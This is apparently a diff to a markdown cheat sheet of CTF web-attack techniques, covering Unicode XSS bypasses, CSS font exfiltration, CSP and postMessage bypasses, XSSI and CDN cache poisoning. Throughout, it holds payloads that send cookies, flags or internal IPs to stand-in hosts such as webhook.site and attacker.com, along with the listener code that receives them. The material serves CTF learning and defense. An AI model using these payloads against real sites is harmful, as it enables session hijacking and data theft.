@@ -3,7 +3,6 @@
 Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles, HMAC bypass, CSP bypasses, and XSSI techniques.
 
 ## Table of Contents
-
 - [Unicode Case Folding XSS Bypass (UNbreakable 2026)](#unicode-case-folding-xss-bypass-unbreakable-2026)
 - [CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026)
 - [Hyperscript CDN CSP Bypass (UNbreakable 2026)](#hyperscript-cdn-csp-bypass-unbreakable-2026)
@@ -25,26 +24,68 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 - [React Component State Extraction via __reactInternalInstance$ (RCTF 2018)](#react-component-state-extraction-via-__reactinternalinstance-rctf-2018)
 - [CloudFlare Cache Poisoning via .js Username + Stored Self-XSS (CONFidence 2019 Teaser)](#cloudflare-cache-poisoning-via-js-username--stored-self-xss-confidence-2019-teaser)
 
-------
+---
+
+## Modern Browser Trust Boundary Additions (2025/2026)
+
+### Popup message and opener confusion
+
+Many modern challenge frontends allow a child popup to send a token or callback back to the parent without verifying the origin. This is usually a browser trust-boundary bug, not a backend crypto bug.
+
+```javascript
+window.addEventListener('message', function (event) {
+  if (event.data && event.data.token) {
+    setCookie(event.data.token);
+  }
+});
+```
+
+**Protection:** verify `event.origin` against an exact allowlist, require `event.source === popup`, and avoid putting raw tokens in URL fragments unless they are one-time nonces.
+
+### `Blob` / `data:` URL content confusion
+
+Some apps incorrectly trust `blob:` or `data:` URLs after reading generated content from a user-controlled source. This becomes dangerous when the browser runs the response as HTML, script, or an image after MIME confusion.
+
+**Checks:**
+- verify `Content-Type` and `X-Content-Type-Options`
+- inspect `URL.createObjectURL` / `data:` flows in pages and iframes
+- look for attacker-controlled filenames or MIME sniffing paths that flip text into executable content
+
+### OAuth popup + state reuse confusion
+
+The browser may hand control from one OAuth flow to another because the app stores only a partial `state` or uses a weak redirect matching function. A callback from one flow can be accepted in another flow if the state is not fully bound to the session and client ID.
+
+**Checklist:**
+- exact `client_id` match
+- exact `redirect_uri` match
+- nonce/state must be unique per login attempt and single-use
+
+### Redirect-based auth and login poisoning
+
+A page that redirects to a user-controlled URL after login can carry a value that is later interpreted as a user name, account ID, or session identifier. This is a classic "redirect then trust" bug.
+
+**Look for:**
+- `?next=`, `?redirect=` and `?return=` parameters
+- login callback flows that preserve a path fragment from the URL
+- subdomain-based redirect validation that only checks suffixes
+
+---
 
 ## Unicode Case Folding XSS Bypass (UNbreakable 2026)
 
 **Pattern (demolition):** Server-side sanitizer (Flask regex `<\s*/?\s*script`) only matches ASCII. A second processing layer (Go `strings.EqualFold`) applies Unicode case folding, which canonicalizes `ſ` (U+017F, Latin Long S) to `s`.
 
 **Payload:**
-
 ```html
 <ſcript>location='https://webhook.site/ID?c='+document.cookie</ſcript>
 ```
 
 **How it works:**
-
 1. Flask regex checks for `<script` -- `<ſcript` does not match (ſ ≠ s in ASCII regex)
 2. Go's `strings.EqualFold` canonicalizes `ſ` to `s`, treating `<ſcript>` as `<script>`
 3. Frontend inserts via `innerHTML` -- browser parses the now-valid script tag
 
 **Other Unicode folding pairs for bypass:**
-
 - `ſ` (U+017F) -> `s` / `S`
 - `ı` (U+0131) -> `i` / `I`
 - `ﬁ` (U+FB01) -> `fi`
@@ -52,43 +93,38 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 
 **Key insight:** Different layers applying different normalization standards (ASCII-only regex vs. Unicode-aware case folding) create bypass opportunities. Check what processing each layer applies.
 
-------
+---
 
 ## CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)
 
 **Pattern (larpin):** Exfiltrate inline script content (e.g., `window.__USER_CONFIG__`) via CSS injection without JavaScript execution. Uses custom font glyph widths and CSS container queries as an oracle.
 
 **Technique:**
-
 1. **Target selection** -- CSS selector targets inline script: `script:not([src]):has(+script[src*='purify'])`
 2. **Custom font** -- Each character glyph has a unique advance width: `width = (char_index + 1) * 1536` font units
 3. **Container query oracle** -- Wrapping element uses `container-type: inline-size`. Container queries match specific width ranges to trigger background-image requests:
-
 ```css
 @container (min-width: 150px) and (max-width: 160px) {
   .probe { background: url('https://attacker.com/?char=a&pos=0'); }
 }
 ```
-
 4. **Per-character probing** -- Iterate positions, each probe narrows to one character based on measured width
 
 **Key insight:** CSS container queries (no JavaScript needed) combined with custom font metrics create a pixel-perfect oracle for text content. Works even under strict CSP that blocks all scripts.
 
-------
+---
 
 ## Hyperscript CDN CSP Bypass (UNbreakable 2026)
 
 **Pattern (minegamble):** CSP allows `cdnjs.cloudflare.com` scripts. Hyperscript (`_hyperscript`) processes `_=` attributes client-side after HTML sanitization, enabling post-sanitization code execution.
 
 **Payload:**
-
 ```html
 <script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
 <div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>
 ```
 
 **How it works:**
-
 1. HTML passes sanitizer (no inline script, no event handlers)
 2. Hyperscript library loads from CDN (allowed by CSP)
 3. Hyperscript scans DOM for `_=` attributes and executes them as behavioral directives
@@ -96,14 +132,13 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 
 **Key insight:** Hyperscript, Alpine.js (`x-data`, `x-init`), htmx (`hx-get`, `hx-trigger`), and similar declarative JS frameworks execute code from HTML attributes that sanitizers don't recognize. If any CDN-hosted behavioral framework is CSP-allowed, it bypasses both CSP and HTML sanitizers.
 
-------
+---
 
 ## PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)
 
 **Pattern (svfgp):** Server checks `secret.startsWith(candidate)` where verification involves expensive PBKDF2 (3M iterations). Mismatches return fast; matches run the full KDF, creating a measurable timing difference.
 
 **Exfiltration via postMessage:**
-
 1. Open target page in a popup
 2. For each character position, probe all candidates (`a-z0-9_}`)
 3. Measure round-trip time via `postMessage` / response timing
@@ -125,14 +160,13 @@ async function probeChar(known, candidates) {
 
 **Key insight:** Any expensive server-side operation (PBKDF2, bcrypt, Argon2) guarded by a short-circuit prefix check creates a timing oracle. The `startsWith` fast-fail vs. full-KDF timing difference is measurable cross-origin via popup navigation timing.
 
-------
+---
 
 ## Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)
 
 **Pattern:** Application builds request URLs client-side with an HMAC parameter. The secret key is hardcoded in obfuscated JavaScript.
 
 **Attack steps:**
-
 1. Deobfuscate client-side JS (jsbeautifier.org or browser DevTools pretty-print)
 2. Locate the signing function and extract the hardcoded secret
 3. Use the leaked function directly in browser console to forge valid signatures for arbitrary requests
@@ -151,7 +185,7 @@ var forgedUrl = "/load?p=index.php&s=" + calcSHA1("index.php" + "Ace in the Hole
 
 **Key insight:** Client-side HMAC/signature schemes leak the secret by definition -- the signing key must be present in the JavaScript. Deobfuscate the JS, extract the secret, then forge signatures for any parameter value. Check for global functions like `calcSHA1`, `hmac`, `sign` in the browser console.
 
-------
+---
 
 ## Terminal Control Character Obfuscation (SECCON 2015)
 
@@ -166,7 +200,7 @@ flag = data.replace(b'\x08', b'').replace(b' ', b'')
 # Or: filter only printable chars that aren't followed by backspace
 ```
 
-------
+---
 
 ## CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)
 
@@ -195,22 +229,19 @@ Deploy with `gcloud functions deploy serveIt --runtime python39 --trigger-http -
 
 **Key insight:** Cloud platform domains are shared infrastructure. Whitelisting `*.run.app` or `*.cloudfunctions.net` in CSP allows any attacker-deployed function to serve scripts. Prefer `nonce-based` or `hash-based` CSP over domain whitelists for cloud-hosted applications.
 
-------
+---
 
 ## CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)
 
 **Pattern (web-tutorial-2):** CSP uses `script-src 'nonce-xxx'` to restrict script execution to nonced scripts. However, the CSP is missing the `base-uri` directive. If you can inject HTML before a nonced script that loads from a relative URL, inject a `<base>` tag to redirect the relative URL to your server.
 
 **Vulnerable CSP:**
-
 ```text
 Content-Security-Policy: script-src 'nonce-abc123'; default-src 'self'
 ```
-
 Notice: no `base-uri` directive.
 
 **Vulnerable page HTML:**
-
 ```html
 <!-- Attacker injects here via stored XSS, parameter injection, etc. -->
 <base href="https://attacker.com/">
@@ -219,14 +250,12 @@ Notice: no `base-uri` directive.
 ```
 
 **How it works:**
-
 1. The `<base href="https://attacker.com/">` tag changes the base URL for all relative URLs on the page
 2. When the browser encounters `<script nonce="abc123" src="test.js">`, it resolves `test.js` relative to the new base -> `https://attacker.com/test.js`
 3. The script has a valid nonce, so CSP allows it
 4. The script loads from the attacker's server, executing arbitrary JavaScript
 
 **Exploit setup:**
-
 ```python
 # Host malicious test.js on attacker server
 # test.js content:
@@ -238,7 +267,6 @@ fetch('/api/flag')
 ```
 
 **Injection payload:**
-
 ```html
 <base href="https://attacker.com/">
 ```
@@ -251,12 +279,11 @@ fetch('/api/flag')
 
 **References:** BSidesSF 2026 "web-tutorial-2"
 
-------
+---
 
 ## XSSI via JSONP Callback with Cloud Function Exfiltration (BSidesSF 2026)
 
 **Pattern (three-questions-3):** Multi-stage attack chain:
-
 1. **Cookie hash inversion:** User ID cookie is `SHA1(numeric_id)` where ID is a small integer (1-100000). Brute-force the hash to recover the numeric ID.
 2. **IDOR on debug endpoint:** `/debug/game-state?user_id=<numeric_id>` returns game state (discovered via HTML comments + robots.txt).
 3. **XSSI exfiltration:** The admin's game state is exfiltrated via Cross-Site Script Inclusion. A JSONP-like endpoint (`/characters.js?callback=leak`) wraps response data in a function call. Inject a `<script src>` tag via an admin message feature that loads this endpoint with a custom callback, which forwards the data to an attacker-controlled cloud function.
@@ -293,7 +320,7 @@ for i in range(1, 100001):
 
 **Defense:** Disable JSONP/callback parameters. Return `Content-Type: application/json` (not `application/javascript`). Add `X-Content-Type-Options: nosniff`. Use CORS properly instead of JSONP.
 
-------
+---
 
 ## CSP Bypass via link prefetch (Boston Key Party 2016)
 
@@ -306,7 +333,7 @@ for i in range(1, 100001):
 
 **Key insight:** CSP restricts script execution but not navigation or resource prefetch. Use `<link rel="prefetch">` or `<meta http-equiv="refresh">` for scriptless exfiltration when XSS is possible but `script-src` blocks inline/remote JS. Data is sent via URL parameters or the `Referer` header.
 
-------
+---
 
 ## Cross-Origin XSS via Shared Parent Domain Cookie Injection (0CTF 2017)
 
@@ -328,14 +355,13 @@ window.XMLHttpRequest = iframe.contentWindow.XMLHttpRequest;
 
 **Key insight:** Domain-scoped cookies cross subdomain boundaries. If any subdomain reflects cookie values without sanitization, setting a malicious cookie from a different subdomain achieves XSS on the target. The iframe trick restores `XMLHttpRequest` when the sandbox environment overrides it.
 
-------
+---
 
 ## Chrome Unicode URL Normalization Bypass (RCTF 2017)
 
 **Pattern:** Chrome normalizes certain Unicode characters to ASCII equivalents during URL processing (IDNA/punycode normalization). This can bypass length restrictions or character filters imposed by the application on domain names or URL components.
 
 **Fuzzing for Unicode-to-ASCII mappings:**
-
 ```python
 # Fuzz Unicode chars that Chrome normalizes to specific ASCII
 import unicodedata
@@ -354,7 +380,6 @@ for r in results:
 ```
 
 **Known useful mappings:**
-
 ```text
 # Characters that normalize to ASCII equivalents:
 U+FF41 (ａ) -> a    # Fullwidth Latin Small Letter A
@@ -365,11 +390,9 @@ U+2100 (℀) -> a/c   # Account Of
 U+2101 (℁) -> a/s   # Addressed to the Subject
 U+FF0F (／) -> /    # Fullwidth Solidus
 U+FF1A (：) -> :    # Fullwidth Colon
-
 ```
 
 **Exploit scenario:**
-
 ```python
 # Application enforces max 6-character domain
 # Unicode domain uses 6 chars but normalizes to 8+ ASCII chars
@@ -382,12 +405,11 @@ unicode_domain = "\uff41\uff42\uff43\uff44\uff45\uff46"  # 6 fullwidth chars
 # Use fullwidth 'ｘ' (U+FF58) instead
 url = "http://e\uff58ample.com/payload"
 # Chrome normalizes to http://example.com/payload
-
 ```
 
 **Key insight:** Chrome's IDNA/punycode normalization converts certain Unicode characters to ASCII equivalents. A 6-character Unicode domain may resolve to an 8-character ASCII domain, bypassing length checks imposed by the application. Fullwidth Latin characters (U+FF00-U+FF5E) are particularly useful as they have 1:1 ASCII mappings. This applies to any client-side URL validation that doesn't apply the same normalization as the browser.
 
-------
+---
 
 ## XSS Dot-Filter Bypass via Decimal IP and Bracket Notation (33C3 CTF 2016)
 
@@ -397,18 +419,17 @@ url = "http://e\uff58ample.com/payload"
 <!-- Filter blocks dots, breaking: document.cookie, attacker.com -->
 <!-- Bypass: decimal IP + bracket notation -->
 <script>
-  window["location"] = "http://1558071511/"["concat"](document["cookie"])
+  window["location"] = "http://1551576387/"["concat"](document["cookie"])
 </script>
 
 <!-- Decimal IP conversion: -->
-<!-- 92*256^3 + 123*256^2 + 45*256 + 67 = 1558071511 -->
-<!-- http://1558071511/ resolves to 92.123.45.67 -->
-
+<!-- 92*256^3 + 123*256^2 + 45*256 + 67 = 1551576387 -->
+<!-- http://1551576387/ resolves to 92.123.45.67 -->
 ```
 
 **Key insight:** Decimal IP addresses are valid in URLs and contain no dots. Combined with JavaScript's bracket notation (which uses string keys instead of dot access), this bypasses any filter that targets the dot character.
 
-------
+---
 
 ## XSS via Referer Header Injection (Tokyo Westerns 2017)
 
@@ -421,7 +442,6 @@ url = "http://e\uff58ample.com/payload"
 <!-- Inject XSS by sending a crafted Referer: -->
 <!-- Referer: javascript:alert(document.cookie) -->
 <!-- Produces: <meta http-equiv="refresh" content="0; url=javascript:alert(document.cookie)"> -->
-
 ```
 
 ```python
@@ -433,11 +453,9 @@ TARGET = "http://target/page"
 xss_payload = "javascript:fetch('https://attacker.com/?c='+document.cookie)"
 r = requests.get(TARGET, headers={"Referer": xss_payload})
 # If target reflects Referer into meta refresh, victim browser executes the JS
-
 ```
 
 **Combining with WebRTC internal IP leak:**
-
 ```javascript
 // WebRTC ICE candidates leak internal IPs without user interaction
 // Inject this payload to discover internal network topology
@@ -451,7 +469,6 @@ pc.onicecandidate = function(ice) {
     // Candidate string contains internal IP: "192.168.x.x" or "10.x.x.x"
     fetch('https://attacker.com/?ip=' + encodeURIComponent(ice.candidate.candidate));
 };
-
 ```
 
 ```bash
@@ -462,12 +479,11 @@ curl -v -H "Referer: test_marker" http://target/page 2>&1 | grep "test_marker"
 # 2. Inject XSS payload that runs WebRTC to leak internal IP
 # 3. Use leaked internal IP for SSRF to localhost:80 or internal services
 # e.g., http://192.168.1.1/admin — accessible only from internal network
-
 ```
 
 **Key insight:** The `Referer` header is rarely sanitized because it's not considered "user input" in the traditional sense. When reflected into `<meta refresh>`, `<script>`, or URL attributes, it enables XSS. WebRTC `RTCPeerConnection` ICE candidates leak internal IPs without any user interaction or special permissions — useful for mapping internal networks after initial XSS.
 
-------
+---
 
 ## Java hashCode() Collision for Auth Bypass (CSAW 2017)
 
@@ -482,7 +498,6 @@ curl -v -H "Referer: test_marker" http://target/page 2>&1 | grep "test_marker"
 if (password.hashCode() == storedHash) {
     grantAccess();   // WRONG: hashCode collisions trivially found
 }
-
 ```
 
 ```python
@@ -515,20 +530,16 @@ for length in range(4, 9):
         if java_hashcode(s) == target_hash:
             print(f"Collision found: '{s}'")
             break
-
 ```
 
 **Known collision pairs:**
-
 ```text
 "Aa"   == "BB"        (hashCode = 2112)
 "AaBB" == "BBAa"      (longer collision)
 "ParDJon" == "Pas$ion"
-
 ```
 
 **Systematic collision generation:**
-
 ```python
 # For any two characters a, b where ord(a)*31 + ord(b) == ord(c)*31 + ord(d):
 # The strings ending in "ab" and "cd" will have the same hash contribution
@@ -542,14 +553,13 @@ def find_collision(target_str):
             candidate = target_str[:-1] + chr(c1) + chr(c2)
             # ... adjust prefix to match hash
     pass
-
 ```
 
 **Key insight:** Java `hashCode()` produces trivial collisions due to its simple polynomial structure and 32-bit overflow. Never use it for security-sensitive comparisons (passwords, tokens, signatures). The collision space is dense — for most hash values, many short colliding strings exist. Use `hashCode()` only for hash table bucket assignment, never for equality/authentication checks.
 
 **Detection:** Java source using `password.hashCode() == storedHash`, token comparison via `token.hashCode()`, or any security check using `.hashCode()` instead of `equals()` with a secure hash (bcrypt, PBKDF2, etc.).
 
-------
+---
 
 ## CSS @font-face unicode-range Data Exfiltration (Harekaze CTF 2018)
 
@@ -569,7 +579,6 @@ def find_collision(target_str):
 
 /* Apply the font to the element containing the secret */
 .target { font-family: exfil; }
-
 ```
 
 ```python
@@ -592,7 +601,6 @@ payload = "\n".join(css_rules)
 # Host as CSS file — MUST serve with Content-Type: text/css for cross-origin
 # Inject via: <link rel="stylesheet" href="http://attacker.com/exfil.css">
 # Or via CSS injection: <style>@import url('http://attacker.com/exfil.css');</style>
-
 ```
 
 ```python
@@ -611,11 +619,9 @@ def leak():
     return '', 204
 
 app.run(host='0.0.0.0', port=80)
-
 ```
 
 **Limitations and workarounds:**
-
 ```text
 # unicode-range leaks character SET, not order or count
 # Leaked: {a, c, f, g, l, _} from "flag_cfg" — no positional info
@@ -624,19 +630,17 @@ app.run(host='0.0.0.0', port=80)
 # 1. Use ::first-letter with a unique font to leak position 1
 # 2. Use text-indent + overflow: hidden tricks to isolate characters
 # 3. Chain with :nth-child selectors if target chars are in separate elements
-
 ```
 
 **Key insight:** CSS `@font-face` with `unicode-range` triggers font fetches only for characters actually present in the target element. Works under strict CSP that blocks scripts but allows `style-src`. Cross-origin CSS must include `Content-Type: text/css`. Leaks character set (not order), so combine with positional CSS tricks if ordering matters. See also the [CSS Font Glyph Width + Container Query Exfiltration](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026) technique for a more precise CSS-only oracle.
 
-------
+---
 
 ### postMessage Null Origin Bypass via data URI Iframe (BackdoorCTF 2018)
 
 **Pattern:** When a web application validates `postMessage` origins, a `data:` URI iframe has a `null` origin that bypasses same-origin checks. Many postMessage handlers check `event.origin !== expected` but don't account for `null` origins, allowing injection from a sandboxed context.
 
 **Vulnerable handler pattern:**
-
 ```javascript
 // Target application's message handler:
 window.addEventListener('message', function(event) {
@@ -646,11 +650,9 @@ window.addEventListener('message', function(event) {
         document.getElementById('content').innerHTML = event.data.details.sender_username;
     }
 });
-
 ```
 
 **Exploit via data: URI iframe:**
-
 ```html
 <iframe src="data:text/html,<script>
 var w = window.open('http://target/page');
@@ -660,11 +662,9 @@ setTimeout(function(){
     }, '*');
 }, 1000);
 </script>"></iframe>
-
 ```
 
 **Alternative: sandboxed iframe approach:**
-
 ```html
 <!-- sandbox attribute without allow-same-origin also produces null origin -->
 <iframe sandbox="allow-scripts" srcdoc="
@@ -674,7 +674,6 @@ setTimeout(function(){
     }, '*');
 </script>
 "></iframe>
-
 ```
 
 ```python
@@ -697,26 +696,22 @@ setTimeout(function(){
 </body></html>
 '''
 # Serve this page, then send the URL to the admin bot
-
 ```
 
 **Key insight:** `data:` URI iframes have a `null` origin. Many postMessage handlers check `event.origin !== expected` but don't account for null origins, allowing injection from a sandboxed context. The `sandbox` attribute without `allow-same-origin` also produces a `null` origin. Always test postMessage handlers with `null` origin by using `data:` URIs or sandboxed iframes. The fix is to explicitly reject `null` and empty origins: `if (!event.origin || event.origin === 'null') return;`.
 
-------
+---
 
 ## CSP Bypass via Attacker-Controlled Mime Type for Same-Origin Scripts (Midnight Sun CTF Finals 2018)
 
 **Pattern (Mimisbrunnr):** Endpoint `/xss?xss=<payload>&mimis=<mime>` echoes `payload` with an attacker-chosen `Content-Type`. CSP is `script-src 'self'` and `X-Content-Type-Options: nosniff` is set, so normal XSS injection is blocked. But by choosing `mimis=application/javascript` (or Chrome's permissive `jscript`), the same-origin response becomes loadable as a script via `<script src="/xss?...&mimis=jscript">`.
 
 **Exploit:**
-
 ```html
 <!-- Served by attacker's XSS injection point (another endpoint on the same origin) -->
 <script src="/xss?xss=function%20WELCOME(){};var%20oooooo=0;/*&mimis=jscript"></script>
 <script src="/xss?xss=*/payload;//&mimis=jscript"></script>
-
 ```
-
 - The first request smuggles harmless tokens that also open a block comment (`/*`).
 - The second request closes the comment (`*/`) and runs the real payload.
 - Because both responses come from `self`, `script-src 'self'` is satisfied even though the browser would normally have rejected them for having a different Content-Type without `nosniff`.
@@ -725,21 +720,19 @@ setTimeout(function(){
 
 **References:** Midnight Sun CTF Finals 2018 — writeup 10258
 
-------
+---
 
 ## React Component State Extraction via __reactInternalInstance$ (RCTF 2018)
 
 **Pattern:** XSS on a React-rendered page cannot directly read server-side state, but every DOM node managed by React carries a property named `__reactInternalInstance$<random>` that links back to the React Fiber node. From there, `.return.stateNode.state` (or `.memoizedState` in newer versions) exposes component state that was never serialized into HTML.
 
 **Exfiltration payload:**
-
 ```javascript
 const key = Object.keys(document.querySelector('[data-react-root]'))
   .find(k => k.startsWith('__reactInternalInstance$'));
 const fiber = document.querySelector('[data-react-root]')[key];
 const state = fiber.return.stateNode.state;
 fetch('https://attacker.example/log?s=' + encodeURIComponent(JSON.stringify(state)));
-
 ```
 
 For React 17+ the property name is `__reactFiber$<random>`, and the path is `.stateNode.memoizedState`. Walk `.return` until you hit a node with `stateNode !== null`.
@@ -748,7 +741,7 @@ For React 17+ the property name is `__reactFiber$<random>`, and the path is `.st
 
 **References:** RCTF 2018 — writeup 10125
 
-------
+---
 
 ## CloudFlare Cache Poisoning via .js Username + Stored Self-XSS (CONFidence 2019 Teaser)
 
@@ -784,7 +777,6 @@ s.get(f'http://target/profile/{user}')
 
 # 5. Report the profile to the admin bot -> cached (authenticated) HTML is served
 #    to the admin, XSS fires, attacker.tld logs ?secret=<flag>
-
 ```
 
 **Key insight:** CDNs cache by URL path/extension, not response `Content-Type` or `Vary: Cookie`; a `.js` (or `.css`, `.svg`, `.ico`, `.png`) suffix often flips a per-user page into a globally-shared static asset and converts a self-XSS into a wormable stored XSS. Always test whether appending common static extensions yields the *same* authenticated content from an unauthenticated fetch — that is the poisoning primitive. Admin-bot challenges behind CloudFlare are especially vulnerable; once poisoned, the next admin visit executes your payload with their cookies.
